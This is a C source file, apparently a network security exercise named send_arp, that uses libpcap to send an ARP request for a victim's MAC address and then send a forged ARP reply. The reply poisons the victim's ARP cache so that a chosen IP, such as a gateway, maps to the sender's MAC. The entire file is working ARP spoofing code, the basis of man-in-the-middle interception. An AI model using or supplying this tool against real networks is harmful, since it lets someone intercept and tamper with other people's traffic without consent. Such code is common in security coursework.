#include <pcap.h>
#include <stdio.h>
#include "send_arp.h"

int main(int argc, char* argv[])
{
    // send_arp <interface> <sender ip> <target ip>
    if (argc != 4)
    {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL)
    {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }

    struct arp_packet ap;
    memset(&ap, 0, sizeof(ap));

    GetSvrMacAddress(ap.sdr_mac);    // my mac
    for(int i = 0; i < 6; i++)
    {
        ap.tgt_mac[i] = 0xFF;
    }
    ip_from_str(ap.tgt_ip, argv[2]); // sender ip

    /******************** Get My IP ********************/
    {
        // https://technote.kr/176 [TechNote.kr]
        struct ifreq ifr;
        char ipstr[40];
        int s;

        s = socket(AF_INET, SOCK_DGRAM, 0);
        strncpy(ifr.ifr_name, "ens33", IFNAMSIZ);

        if (ioctl(s, SIOCGIFADDR, &ifr) < 0)
        {
            printf("Error");
        }
        else
        {
            inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ipstr, sizeof(struct sockaddr));
            // ipstr[strlen(ipstr)] = '\0';    // restrict to string from array

            memset(ap.sdr_ip, 0, sizeof(ap.sdr_ip));

            for(unsigned int i = 0, cnt = 0; i < strlen(ipstr); i++)
            {
                if(ipstr[i] == '.')
                {
                    cnt++;
                }
                else
                {
                    ap.sdr_ip[cnt] = ap.sdr_ip[cnt] * 10 + (ipstr[i] - '0');
                }
            }

        }
    }

    /******************** Set ARP-Request Packet  ********************/
    {
        memcpy(ap.e.ether_dhost, ap.tgt_mac, sizeof(ap.tgt_mac));
        memcpy(ap.e.ether_shost, ap.sdr_mac, sizeof(ap.sdr_mac));
        ap.e.ether_type = htons(ETHERTYPE_ARP);

        ap.a.ar_hrd = htons(ARPHRD_ETHER);
        ap.a.ar_pro = htons(ETHERTYPE_IP);
        ap.a.ar_hln = MAC_SIZE;
        ap.a.ar_pln = IP_SIZE;
        ap.a.ar_op  = htons(ARPOP_REQUEST);

        for(int i = 0; i < 6; i++)
        {
            ap.tgt_mac[i] = 0x00;
        }

        pcap_sendpacket(handle, (const u_char*)&ap, sizeof(ap));
    }
    {
        for(unsigned int i=0; i<sizeof(ap); i++)
        {
            printf("%.2X ", ((const u_char*)&ap)[i]);
            if(i%16 == 15) printf("\n");
        }
        printf("\n\n");
    }

    /******************** Get Sender's MAC  ********************/
    {
        while (true)
        {
            struct pcap_pkthdr* header;
            const u_char* packet;
            int res = pcap_next_ex(handle, &header, &packet);
            if (res == 0) continue;
            if (res == -1 || res == -2) break;

            const u_char tmp_mac[6] = {0, };    // dest mac
            memcpy((void*)tmp_mac, packet, sizeof(tmp_mac));

            printf("%d %d %d\n", is_same_mac(tmp_mac, ap.sdr_mac), is_reply_arp_packet(packet),
                   is_same_ip(ap.tgt_ip, (u_char*)&packet[LIBNET_ETH_H + LIBNET_ARP_H + 6]));

            if( is_same_mac(tmp_mac, ap.sdr_mac) && is_reply_arp_packet(packet)
                    && is_same_ip(ap.tgt_ip, (u_char*)&packet[LIBNET_ETH_H + LIBNET_ARP_H +6]))
            {
                memcpy((void*)ap.tgt_mac, &packet[LIBNET_ETH_H + LIBNET_ARP_H], sizeof(ap.tgt_mac));
                break;
            }
        }
    }

    /******************** Set Fake-ARP Packet  ********************/
    {
        memcpy(ap.e.ether_dhost, ap.tgt_mac, sizeof(ap.e.ether_dhost));
        ip_from_str(ap.sdr_ip, argv[3]);
        // printf("%s %s\n", ap.sdr_ip, argv[3]);
        ap.a.ar_op  = htons(ARPOP_REPLY);

        // memcpy(ap.sdr_ip, &arp_packet[LIBNET_ETH_H + LIBNET_ARP_H + 6], sizeof(sdr_ip));
    }
    {
        for(int i=0; i<LIBNET_ETH_H + LIBNET_ARP_ETH_IP_H; i++)
        {
            printf("%.2X ", ((const u_char*)&ap)[i]);
            if(i%16 == 15) printf("\n");
        }
        printf("\n");
    }

    pcap_sendpacket(handle, (const u_char*)&ap, sizeof(ap));

    pcap_close(handle);
    return 0;
}
